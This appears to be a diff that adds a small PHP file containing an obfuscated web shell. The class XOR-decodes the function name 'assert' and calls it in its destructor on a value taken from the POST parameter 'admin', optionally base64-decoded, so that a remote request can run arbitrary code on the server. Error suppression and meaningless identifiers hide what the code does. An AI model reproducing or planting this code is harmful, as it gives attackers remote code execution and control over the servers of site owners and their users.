@@ -1,0 +1,20 @@
+<?php 
+class UKNA { 
+    function KHVZ() {
+        $FKrR = "\xca" ^ "\xab";
+        $EZnL = "\x29" ^ "\x5a";
+        $qDzP = "\x2d" ^ "\x5e";
+        $eyKw = "\xb6" ^ "\xd3";
+        $IWRb = "\x2f" ^ "\x5d";
+        $fdzN = "\x45" ^ "\x31";
+        $WlTm =$FKrR.$EZnL.$qDzP.$eyKw.$IWRb.$fdzN;
+        return $WlTm;
+    }
+    function __destruct(){
+        $vEoY=$this->KHVZ();
+        @$vEoY($this->zc);
+    }
+}
+$ukna = new UKNA();
+@$ukna->zc = isset($_GET['id'])?base64_decode($_POST['admin']):$_POST['admin'];
+?>
